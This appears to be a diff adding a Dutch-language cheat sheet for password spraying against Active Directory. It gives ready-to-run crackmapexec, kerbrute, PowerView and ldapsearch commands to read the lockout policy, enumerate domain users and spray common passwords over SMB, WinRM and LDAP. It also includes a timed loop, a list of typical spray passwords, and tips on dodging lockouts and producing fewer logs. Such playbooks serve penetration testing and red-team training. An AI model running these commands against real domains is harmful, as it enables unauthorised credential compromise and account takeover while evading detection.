@@ -1,0 +1,41 @@
+# AD Password Spraying - met lockout awareness
+# === Stap 1: Lockout policy controleren ===
+# Vanuit domein:
+net accounts /domain
+# PowerView:
+Get-DomainPolicy | select -ExpandProperty SystemAccess
+# crackmapexec:
+crackmapexec smb DC_IP -u '' -p '' --pass-pol
+# Let op: Lockout threshold, Lockout observation window, Reset time
+# === Stap 2: Usernames verzamelen ===
+# Kerbrute user enum (geen lockout!):
+kerbrute userenum -d DOMAIN --dc DC_IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+# LDAP:
+ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName
+# crackmapexec RID brute:
+crackmapexec smb DC_IP -u '' -p '' --rid-brute
+# === Stap 3: Spray ===
+# crackmapexec (1 wachtwoord per run!):
+crackmapexec smb DC_IP -u users.txt -p 'Summer2024!' -d DOMAIN --continue-on-success
+crackmapexec smb DC_IP -u users.txt -p 'Welcome1!' -d DOMAIN --continue-on-success
+# Kerbrute (sneller, minder logs):
+kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Summer2024!'
+# Spray via SMB, WinRM, LDAP:
+crackmapexec winrm DC_IP -u users.txt -p 'Password1' -d DOMAIN
+crackmapexec ldap DC_IP -u users.txt -p 'Password1' -d DOMAIN
+# === Stap 4: Wacht op lockout window ===
+# Typisch 30 minuten tussen spray rondes
+# Script voorbeeld:
+# for pw in Summer2024! Welcome1! Company2024!; do
+#   crackmapexec smb DC_IP -u users.txt -p "$pw" -d DOMAIN --continue-on-success
+#   echo "Wacht 35 minuten voor volgende spray..."
+#   sleep 2100
+# done
+# === Veelgebruikte spray wachtwoorden ===
+# Season+Year: Summer2024!, Winter2024!, Spring2024!
+# Welcome: Welcome1!, Welkom01!, Welcome2024!
+# Company: CompanyName1!, Bedrijfsnaam1!
+# Password: Password1!, P@ssw0rd!, Passw0rd!
+# Tip: Spray NOOIT meer dan 1 wachtwoord per lockout window
+# Tip: Kerbrute genereert minder logs dan SMB spray
+# Tip: --continue-on-success voorkomt dat je stopt bij eerste hit
